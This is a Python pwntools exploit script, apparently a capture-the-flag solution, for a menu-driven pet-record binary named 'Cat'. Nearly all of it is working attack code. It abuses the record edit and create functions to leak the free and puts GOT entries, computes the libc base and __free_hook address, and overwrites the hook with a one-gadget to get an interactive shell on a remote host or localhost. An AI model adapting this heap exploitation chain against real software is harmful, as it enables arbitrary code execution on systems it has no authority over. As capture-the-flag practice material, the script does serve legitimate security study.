#!/usr/bin/python

#The libc was obtained by leaking pointers from the GOT and searching the libc_database

from pwn import *
import sys
def create(name,kind,age):
    r.sendline("1")
    r.recvuntil("What's the pet's name?\n> ")
    r.sendline(name)
    r.recvuntil("What's the pet's kind?\n> ")
    r.sendline(kind)
    r.recvuntil("How old?\n> ")
    r.sendline(str(age))
    r.recvuntil("create record id:")
    id = int(r.recvuntil("\n"))
    r.recvuntil("which command?\n> ")
    return id

def edit(id,name,kind,save,age):
    r.sendline("2")
    r.recvuntil("which id?\n> ")
    r.sendline(str(id))
    r.recvuntil("What's the pet's name?\n> ")
    r.sendline(name)
    r.recvuntil("What's the pet's kind?\n> ")
    r.sendline(kind)
    r.recvuntil("How old?\n> ")
    r.sendline(str(age))
    r.recvuntil("Would you modify? (y)/n> ")
    if (save):
        r.sendline("yes")
    else:
        r.sendline("no")
    try:
        r.recvuntil("which command?\n> ",timeout=5)
    except:
        pass
    return

def delete(id):
    r.sendline("5")
    r.recvuntil("which id?\n> ")
    r.sendline(str(id))
    r.recvuntil("which command?\n> ")
    return

def printPet(id):
    r.sendline("3")
    r.recvuntil("which id?\n> ")
    r.sendline(str(id))
    leak1 = r.recvline()[6:-1]
    if len(sys.argv) > 1:
        leak1 =  u64(leak1.ljust(8,"\x00")[:8])
    else:
        leak1 =  u64((leak1[:3]+"\x00\x40").ljust(8,"\x00"))
    leak2 = r.recvline()[6:-1]
    if len(sys.argv) > 1:
        leak2 =  u64(leak2.ljust(8,"\x00")[:8])
    else:
        leak2 =  u64((leak2[:3]+"\x00\x40").ljust(8,"\x00"))
    r.recvuntil("which command?\n> ")
    return leak1,leak2

chal = ELF("Cat")
free_got = chal.got["free"]
puts_got = chal.got["puts"]

pets = 0x6020C0
if len(sys.argv) > 1:
    r = remote("178.62.40.102",6000)
    libc = ELF("libc.so.6")
else:
    r = remote("localhost",4000)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


gadget_offset = int(sys.argv[1])

create("buffo","buffo",3)
create("buffo2","buffo2",4)
edit(0,"fuffa","fuffa",False,1)
create("LOL",p64(pets)+p64(pets+8),42)
edit(0,p64(0x6020C8),p64(free_got)+p64(puts_got),True,1)
free_run, puts_run = printPet(4)
log.info(hex(free_run))
log.info(hex(puts_run))
libc_base = free_run - libc.symbols["free"]
log.info(hex(libc_base))
free_hook_run = libc.symbols["__free_hook"] + free_run - libc.symbols["free"]
log.info(hex(free_hook_run))

edit(1,"fuffa","fuffa",False,1)
create("LOL",p64(free_hook_run)+p64(pets+0x100),42)
edit(1,p64(gadget_offset+ libc_base),p64(0x00)+p64(0x00),True,1)






r.interactive()
